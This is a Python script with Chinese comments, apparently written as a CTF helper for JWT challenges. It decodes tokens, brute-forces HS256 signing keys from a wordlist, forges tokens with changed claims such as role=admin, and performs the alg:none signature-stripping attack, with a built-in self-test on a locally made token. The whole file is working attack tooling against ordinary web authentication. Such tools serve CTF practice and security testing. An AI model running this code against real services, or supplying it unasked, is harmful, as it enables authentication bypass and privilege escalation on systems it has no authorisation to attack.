# -*- coding: utf-8 -*-
"""JWT 破解与伪造(补充题型: Web/JWT) — 纯标准库, 无第三方依赖

用途:
    1) 解码 JWT 三段, 查看 header/payload
    2) HS256 弱密钥爆破: 逐个候选密钥试 HMAC-SHA256 签名
    3) 伪造新 token: 改 payload + 指定密钥重签; 或 alg:none 去签名攻击

用法:
    python jwt_forge.py                        # 自测(内置回环)
    python jwt_forge.py -t <token>             # 仅解码
    python jwt_forge.py -t <token> -w rockyou.txt      # 字典爆破 HS256 密钥
    python jwt_forge.py -t <token> -f --key s3cr3t     # 改 role=admin 伪造
    python jwt_forge.py -t <token> -f --none           # alg:none 攻击
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import sys


def b64url_decode(s: str) -> bytes:
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()


def decode_token(token: str):
    parts = token.strip().split('.')
    if len(parts) != 3:
        raise ValueError(f'token 段数 {len(parts)} != 3')
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, parts[2]


def sign_hs256(header_b64: str, payload_b64: str, key: str) -> bytes:
    return hmac.new(key.encode(), f'{header_b64}.{payload_b64}'.encode(), hashlib.sha256).digest()


def brute_hs256(token: str, candidates) -> str | None:
    # 签名覆盖的是 token 原文前两段的字节, 不能用 json.dumps 重新序列化代替:
    # 原始 token 非规范 JSON(带空格/键序不同/非 ASCII)时, 重造字节永远验不中
    parts = token.strip().split('.')
    if len(parts) != 3:
        raise ValueError(f'token 段数 {len(parts)} != 3')
    msg = f'{parts[0]}.{parts[1]}'.encode()
    target = b64url_decode(parts[2])
    for cand in candidates:
        cand = cand.rstrip('\n')
        if hmac.new(cand.encode(), msg, hashlib.sha256).digest() == target:
            return cand
    return None


def forge(token: str, new_payload: dict, key: str | None, none_alg: bool = False) -> str:
    h, _, _ = decode_token(token)
    if none_alg:
        h['alg'] = 'none'
        hb = b64url_encode(json.dumps(h, separators=(',', ':')).encode())
        pb = b64url_encode(json.dumps(new_payload, separators=(',', ':')).encode())
        return f'{hb}.{pb}.'
    if not key:
        raise ValueError('非 none 算法需要 --key')
    h['alg'] = 'HS256'
    hb = b64url_encode(json.dumps(h, separators=(',', ':')).encode())
    pb = b64url_encode(json.dumps(new_payload, separators=(',', ':')).encode())
    sig = sign_hs256(hb, pb, key)
    return f'{hb}.{pb}.{b64url_encode(sig)}'


def main():
    ap = argparse.ArgumentParser(description='JWT 解码/爆破/伪造')
    ap.add_argument('-t', '--token')
    ap.add_argument('-w', '--wordlist', help='HS256 密钥字典文件')
    ap.add_argument('--keys', help='逗号分隔的候选密钥')
    ap.add_argument('-f', '--forge', action='store_true')
    ap.add_argument('--set', action='append', default=[],
                    help='伪造时覆盖 payload 字段, 如 --set role=admin')
    ap.add_argument('--key', help='伪造使用的密钥')
    ap.add_argument('--none', action='store_true', help='alg:none 攻击')
    args = ap.parse_args()

    if args.token:
        h, p, sig = decode_token(args.token)
        print('header :', json.dumps(h, ensure_ascii=False))
        print('payload:', json.dumps(p, ensure_ascii=False))
        if args.wordlist or args.keys:
            cands = []
            if args.wordlist:
                with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                    cands.extend(f.readlines())
            if args.keys:
                cands.extend(args.keys.split(','))
            found = brute_hs256(args.token, cands)
            print('密钥破解:', repr(found) if found else '未找到')
        if args.forge:
            new_p = dict(p)
            for kv in args.set:
                k, v = kv.split('=', 1)
                new_p[k] = v
            tok = forge(args.token, new_p, args.key, none_alg=args.none)
            print('伪造token:', tok)
    else:
        # 自测
        ok = True
        secret = 's3cr3t'
        # 手造一个 HS256 token
        hb = b64url_encode(b'{"alg":"HS256"}')
        pb = b64url_encode(b'{"user":"guest","role":"guest"}')
        sig = b64url_encode(sign_hs256(hb, pb, secret))
        token = f'{hb}.{pb}.{sig}'
        # 1) 解码
        h, p, s = decode_token(token)
        good = p['user'] == 'guest'
        ok &= good
        print(f"[{'OK' if good else 'FAIL'}] 解码: {p}")
        # 2) 爆破
        found = brute_hs256(token, ['123456', 'password', 's3cr3t', 'admin'])
        good = found == secret
        ok &= good
        print(f"[{'OK' if good else 'FAIL'}] 爆破密钥: {found!r}")
        # 2b) 非规范字节(header 带空格)也要能爆破
        hb2 = b64url_encode(b'{"alg": "HS256"}')
        sig2 = b64url_encode(sign_hs256(hb2, pb, secret))
        found2 = brute_hs256(f'{hb2}.{pb}.{sig2}', ['123456', 's3cr3t'])
        good = found2 == secret
        ok &= good
        print(f"[{'OK' if good else 'FAIL'}] 爆破非规范header: {found2!r}")
        # 3) 伪造
        forged = forge(token, {'user': 'admin', 'role': 'admin'}, secret)
        fh, fp, fs = decode_token(forged)
        fh_b = b64url_encode(json.dumps(fh, separators=(',', ':')).encode())
        fp_b = b64url_encode(json.dumps(fp, separators=(',', ':')).encode())
        good = (fp['role'] == 'admin'
                and sign_hs256(fh_b, fp_b, secret) == b64url_decode(fs))
        ok &= good
        print(f"[{'OK' if good else 'FAIL'}] 伪造+验签: {fp}")
        # 4) none 攻击
        none_tok = forge(token, {'user': 'admin'}, 'x', none_alg=True)
        nh, _, ns = decode_token(none_tok)
        good = nh['alg'] == 'none' and ns == ''
        ok &= good
        print(f"[{'OK' if good else 'FAIL'}] alg:none: {none_tok[:40]}...")
        sys.exit(0 if ok else 1)


if __name__ == '__main__':
    main()
